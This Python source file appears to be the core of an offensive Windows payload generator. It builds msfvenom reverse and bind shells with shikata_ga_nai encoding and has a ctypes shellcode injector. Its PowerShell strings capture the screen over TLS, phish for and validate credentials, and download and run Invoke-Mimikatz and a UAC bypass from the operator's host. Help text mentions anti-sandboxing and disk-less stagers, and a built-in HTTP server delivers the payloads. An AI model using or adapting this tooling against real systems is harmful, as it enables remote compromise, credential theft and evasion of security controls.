# -*- coding: utf-8 -*-
from __future__ import unicode_literals
import os
import socket
import re
import subprocess
import struct
import sys
import blessed
import random
import SimpleHTTPServer
import SocketServer
import multiprocessing
from Crypto.Cipher import AES
import base64
import string
import glob
import readline
import time
import psexec
import urllib2
from collections import OrderedDict
import string
import asyncore
import ssl
import threading
import prompt_toolkit
from prompt_toolkit.contrib.completers import WordCompleter
import netifaces



t = blessed.Terminal()

def sandboxChoose(choice):
    from menu import sandboxMenuOptions, getAndRunSandboxMenu
    if sandboxMenuOptions[choice]['availablemodules']:
        sandboxMenuOptions[choice]['availablemodules'] = None
    else:
        sandboxMenuOptions[choice]['availablemodules'] = {str('ON'): ''}
    return "clear"


def payloaddir():
    return os.path.expanduser('~') + '/winpayloads'

def msfvenomGeneration(payload, ip, port):
    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python', '-e', 'x86/shikata_ga_nai'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    LOADING = Spinner('Generating Shellcode')
    while p.poll() == None:
        LOADING.Update()
        time.sleep(0.2)
    print '\r',
    sys.stdout.flush()

    payload = p.stdout.read()
    compPayload = re.findall(r'"(.*?)"', payload)

    return ''.join(map(str, compPayload))


def getHelp(*helpItem):
    helpItem = ''.join(helpItem)
    helpDict = {
    '1' : '- Generates a metasploit reverse tcp shell.',
    '2' : '- Generates a metasploit reverse tcp meterpreter shell.',
    '3' : '- Generates a metasploit bind tcp meterpreter shell.',
    '4' : '- Generates a metasploit reverse HTTPS meterpreter shell.',
    '5' : '- Generates a metasploit reverse meterpreter shell with DNS.',
    '6' : '- Generates a custom payload from user input (shellcode)',
    'stager' : '- Produces a small base64 encoded powershell one liner that can be used for metasploit payloads and the powershell menu.'\
               ' It is small enough to fit in a windows run prompt and can be used with a ducky for quick exploitation\n'\
               '- After a connection has been made, you can select any metasploit payload and it will give you the option to execute the'\
               ' payload over the powershell stager(without touching disk)',
    'sandbox' : '- Select anti sandboxing techniques for use in metasploit payloads and stager payloads.'
    }

    if helpDict.has_key(helpItem):
        return helpDict[helpItem]
    else:
        return t.bold_red + '[!] Enter a valid menu option to recieve help'

class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler): #patching httpserver to shutup
    def log_message(self, format, *args):
        return

class InterfaceSelecta():
    def __init__(self):
        self.num = 0
        self.interfaces = []
        self.interface = None
        self.defaultInterfaceName = None

        try:
            self.defaultInterfaceName = netifaces.gateways()['default'][netifaces.AF_INET][1]
        except KeyError:
            pass

        for interface in netifaces.interfaces():
            self.num += 1

            if self.defaultInterfaceName == interface:
                isdefault = True
            else:
                isdefault = False
            try:
                self.interfaces += [{'num': self.num, 'interface': interface, 'addr': netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'], 'default': isdefault}]
            except:
                pass

        for interface in self.interfaces:
            if interface['default']:
                self.interface = interface
            if not self.interface:
                if interface['interface'] == 'lo':
                    self.interface = interface
                else:
                    self.interface = interface


    def ChooseInterface(self, set=False):
        if set:
            for i in self.interfaces:
                if self.interface == i:
                    currentinterface = t.bold_green + ' *'
                else:
                    currentinterface = ''
                print t.bold_yellow + str(i['num']) +  ': ' + t.normal + i['addr'] + ' (' + i['interface'] + ')' + currentinterface

            while True:
                interinput = prompt_toolkit.prompt("Interface > ", completer=WordCompleter([str(x+1) for x in range(self.num-1)]), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}))
                for i in self.interfaces:
                    if interinput == str(i['num']):
                        self.interface = i
                        return self.interface

        return self.interface



class SHELLCODE(object):
    @staticmethod
    def windows_rev_shell(ip, port):
        return msfvenomGeneration('windows/shell_reverse_tcp', ip, port)

    @staticmethod
    def windows_met_rev_shell(ip, port):
        return msfvenomGeneration('windows/meterpreter/reverse_tcp', ip, port)

    @staticmethod
    def windows_met_bind_shell(ip, port):
        return msfvenomGeneration('windows/meterpreter/bind_tcp', ip, port)

    @staticmethod
    def windows_met_rev_https_shell(ip, port):
        return msfvenomGeneration('windows/meterpreter/reverse_https', ip, port)

    @staticmethod
    def windows_met_rev_shell_dns(ip, port):
        return msfvenomGeneration('windows/meterpreter/reverse_tcp_dns', ip, port)

    @staticmethod
    def windows_custom_shellcode():
        customshell = ''
        print 'Paste custom shellcode below\nType \'END\' when done.'
        while True:
            buildstr = raw_input().rstrip()
            if buildstr == 'END':
                break
            else:
                customshell += buildstr
        return customshell



    windows_ps_rev_watch_screen = (
        "Try{Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$ssl.AuthenticateAsClient($env:computername);Start-Sleep -s 1;function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
        "function SendStrResponse($sock, $string){$bytesSent = $sock.Write([text.Encoding]::Ascii.GetBytes($string))};"
        "function SendHeader($sock,$length,$statusCode = \"200 OK\",$mimeHeader=\"text/html\",$httpVersion=\"HTTP/1.1\"){$response = \"HTTP/1.1 $statusCode`r`n\" + \"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n\";"
        "SendStrResponse $sock $response;}SendHeader $ssl;"
        "While ($client.Connected){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
        "$g = [System.Drawing.Graphics]::FromImage($b);"
        "$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);"
        "$g.Dispose();$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));"
        "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
        "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
        "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()}catch{Exit}")

    windows_ps_ask_creds_tcp = (
        "$ErrorActionPreference=\'SilentlyContinue\';Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
        "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
        "$domainDN = \'LDAP://\' + ([ADSI]\'\').distinguishedName;"
        "$credential = $host.ui.PromptForCredential(\'Credentials are required to perform this operation!\', \'\', \'\', \'\');"
        "if($credential){$creds = $credential.GetNetworkCredential();$user = $creds.username;$pass = $creds.password;"
        "echo \' INCORRECT:\'$user\':\'$pass;"
        "$authlocal = $DS.ValidateCredentials($user, $pass);"
        "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
        "echo \' CORRECT:\'$user\':\'$pass}}")

    windows_invoke_mimikatz = (
        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-Mimikatz.ps1\\\");"
        "Invoke-Mimikatz -DumpCreds")

    windows_uac_bypass = (
        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\\\");"
        "Invoke-SilentCleanUpBypass -Command \\\"powershell.exe -c %s\\\"")


    injectwindows = """
shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
bufe = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),bufe,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""


class FUNCTIONS(object):

    def powershellShellcodeLayout(self,powershellExec):
        powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
        count = 0
        newpayloadlayout = ''
        for char in powershellShellcode:
            count += 1
            newpayloadlayout += char
            if count == 4:
                newpayloadlayout += ','
                count = 0
        return newpayloadlayout

    def ServePayload(self, payloaddirectory, IP, port):
        try:
            os.chdir(payloaddirectory)
            httpd = SocketServer.TCPServer((IP, port), HANDLER)
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        except:
            print t.bold_red + '\n[*] Port in use' + t.normal

    def DoServe(self, IP, payloadname, payloaddir, port, printIt):
        if printIt:
            print t.bold_green + "\n[*] Serving Payload On http://%s:%s/%s.exe" % (IP, port, payloadname) + t.normal
        a = multiprocessing.Process(
            target=self.ServePayload, args=(payloaddir, IP, port))
        a.daemon = True
        a.start()

    def randomUnusedPort(self):
        from menu import returnIP
        s = socket.socket()
        s.bind((returnIP(), 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def stagePowershellCode(self, powershellFileContents, port):
        from menu import returnIP
        DIR = 'stager'
        if not os.path.isdir(DIR):
            os.mkdir(DIR)
        os.chdir(DIR)
        with open('stage.ps1','w') as psFile:
            psFile.write(powershellFileContents)
        httpd = SocketServer.TCPServer((returnIP(), port), HANDLER)
        httpd.handle_request()
        os.chdir('..')
        import shutil
        shutil.rmtree(DIR)

class Spinner(object):

    def __init__(self,text):
        self.spinner = [
            ["|", "\\", "-", "/"],
            ["▁","▃","▄","▅","▆","▇","█","▇","▆","▅","▄","▃"],
            ["◡◡", "⊙⊙", "◠◠"],
            ["◐","◓","◑","◒"],
            ["▉","▊","▋","▌","▍","▎","▏","▎","▍","▌","▋","▊","▉"],
            [".","o","O","@","*"],
            ["◴","◷","◶","◵"],
            ["▖","▘","▝","▗"],
            ["←","↖","↑","↗","→","↘","↓","↙"],
            ["█▒▒▒▒▒▒","██▒▒▒▒▒","███▒▒▒▒","████▒▒▒","█████▒▒","██████▒","███████"],
            ["◢","◣","◤","◥"],
            ["( ●    )", "(  ●   )", "(   ●  )", "(    ● )", "(     ●)", "(    ● )", "(   ●  )", "(  ●   )", "( ●    )", "(●     )"]
            ]
        self.loading = list(text)
        self.randomchoice = random.choice(self.spinner)
        self.spin_1 = len(self.randomchoice)
        self.spin_2 = len(self.loading) + 1
        self.x = 0

    def Looper(self, text):
        print t.bold_green,
        sys.stdout.write('\r')
        sys.stdout.write(text)
        print t.normal,
        sys.stdout.flush()

    def Update(self):
        self.spin_2mod = self.x % self.spin_2
        self.Looper(self.randomchoice[self.x % self.spin_1] + " " + "".join(
            self.loading[0: (self.spin_2mod)]) + (" " * (self.spin_2 - self.spin_2mod)))
        self.x += 1
